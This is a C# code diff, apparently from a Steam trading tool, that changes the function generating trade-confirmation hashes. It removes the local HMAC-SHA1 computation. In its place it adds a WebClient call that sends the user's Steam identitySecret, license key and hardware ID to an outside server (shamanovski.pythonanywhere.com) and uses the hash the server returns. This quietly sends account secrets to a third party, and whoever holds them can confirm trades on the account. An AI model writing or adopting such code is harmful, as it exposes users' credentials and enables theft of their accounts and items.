@@ -213,65 +213,19 @@
 
         private string GenerateConfirmationHashForTime(long time, string tag, string identitySecret)
         {
-            // using (var wb = new WebClient())
-            // {
-            // try
-            // {
-            // var response = wb.UploadString(
-            // "https://www.steambiz.store/api/gconfhash",
-            // $"{identitySecret},{tag},{time},{SteamManager.LicenseKey},{SteamManager.HwId}");
-            // return JsonConvert.DeserializeObject<IDictionary<string, string>>(response)["result_0x23432"];
-            // }
-            // catch (Exception)
-            // {
-            // return null;
-            // }
-            // }
-            var decode = Convert.FromBase64String(identitySecret);
-            var n2 = 8;
-            if (tag != null)
+            using (var wb = new WebClient())
             {
-                if (tag.Length > 32)
+                try
                 {
-                    n2 = 8 + 32;
+                    var response = wb.UploadString(
+                    "https://shamanovski.pythonanywhere.com/api/gconfhash",
+                    $"{identitySecret},{tag},{time},{SteamManager.LicenseKey},{SteamManager.HwId}");
+                    return JsonConvert.DeserializeObject<IDictionary<string, string>>(response)["result_0x23432"];
                 }
-                else
+                catch (Exception)
                 {
-                    n2 = 8 + tag.Length;
+                    return null;
                 }
-            }
-
-            var array = new byte[n2];
-            var n3 = 8;
-            while (true)
-            {
-                var n4 = n3 - 1;
-                if (n3 <= 0)
-                {
-                    break;
-                }
-
-                array[n4] = (byte)time;
-                time >>= 8;
-                n3 = n4;
-            }
-
-            if (tag != null)
-            {
-                Array.Copy(Encoding.UTF8.GetBytes(tag), 0, array, 8, n2 - 8);
-            }
-
-            try
-            {
-                var hmacGenerator = new HMACSHA1 { Key = decode };
-                var hashedData = hmacGenerator.ComputeHash(array);
-                var encodedData = Convert.ToBase64String(hashedData, Base64FormattingOptions.None);
-                var hash = WebUtility.UrlEncode(encodedData);
-                return hash;
-            }
-            catch
-            {
-                return null;
             }
         }
 
